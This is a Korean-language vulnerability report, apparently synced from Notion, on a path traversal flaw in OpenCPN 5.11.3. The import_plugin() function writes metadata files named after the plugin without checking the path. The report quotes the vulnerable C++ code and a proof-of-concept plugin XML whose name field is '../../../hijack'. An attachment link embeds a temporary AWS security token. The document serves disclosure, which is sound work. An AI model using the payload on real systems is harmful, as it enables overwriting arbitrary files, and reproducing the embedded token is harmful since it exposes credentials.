---
notion_url: https://www.notion.so/c3bbe0809830830a942b01d9cc6acbc6
last_synced: 2026-06-11 19:52
tags: [notion-sync]
---

# [KOR] OpenCPN File overwrite - Path traversal report

취약점 제목 : OpenCPN File overwrite - Path traversal report
취약점 요약 : 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Path Traversal
영향 : 프로세스 권한의 File Overwrite
취약한 파일명 : Console.cpp
취약한 함수명 : import_plugin()
취약한 파라미터 : metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```

`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```

 `<name>` 에 ..나 /를 넣어 Path traversal 시도

![image](_assets/image.png)


취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SRXCPGOY%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T105232Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJGMEQCIFclkCSsUKUmqoGTIuOk9pELGhb%2B1OIEuwfofynnud4jAiAJMZsP33wLQykxXhSuyVeiE6cB%2FjflNIFfzVW4mMfUbSqIBAj7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMUAvUCwzMBtzH9iPoKtwDEAvuLmGzYe0sal8fb%2F7fj2xQLMxKOT5oTBH6CzP1WjCORxIbBIt8B7%2B7NESBI53uHo1x%2FakGRbKhMuLRuWkyH4a%2BXhYqSByLFSTNvV88QhbMYZ0450fb0mzQArN3nj62Pgl11kBAhtI5EB%2BYrwiDz3ODpcIQUL%2BXLwwMGrkBPVKcEl22u1vxngSS3M3q7tVfkYDuFve1%2FofnsssVwX9DZynAYY8vFPln2QJMevLyoRBCaJmfR4wfYjtyL6roWozHO%2B%2FAhDrbaBYgKHexSW24MGxZS2b2cckASOPrmzai9%2BlPhOozPelInaGMOjTo6KKXkM93MKL8%2Fx0klnZbNxGY6e3p2w5JLDyFCB33HXMAuaUAHS2qgzicY4ZgGEj19KOQ6itQJ4OI0lV0qSExKqkyXGUcHicoRdHk06ircJNJ3qpqVJfeAFPgvo4GG7Ub1TbXqGSRyc%2Bij7FRllK325h1u0LhfhOZ0WUvKrrI67vJ4k5eAEJFrN5gY0zR%2BXhug4UimnqMwEVzxKY7fu3KfL0ygwJsQ%2FxLFV1JamqXzc9ybs5ILTp1ttWGKLn17SmEiI9x%2BzFNuySAguDBEhMt%2Bmde453yTbMhstOoX3fNTv%2BXHw0wLZ2kwhrhU2zziDowsP%2Bp0QY6pgH718vRrQTC4c8w%2BtVMf40pFf2Kk3TrHvwsKDSnP9SuZJojLN0zUehLxALRCclLLcD8yHuVWPwqw7bPIR6YpBdu09JrGVqn98H8Xe7aWOROphF0WLqCS47yuOtVf7NQ7no3fp8arSuZ0syCzYY3qgi6J7xLltJc%2B1N4OOWQZo47j2AfUfS1%2BOtcV34CDYsfkZXLDYSaelYZtl20y5mLPC1oSGOJpTbV&X-Amz-Signature=8d7c0c7f5ec29a946b3873f9c2897fb722579fb4dafcc80e3ea897e088ba78ad&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
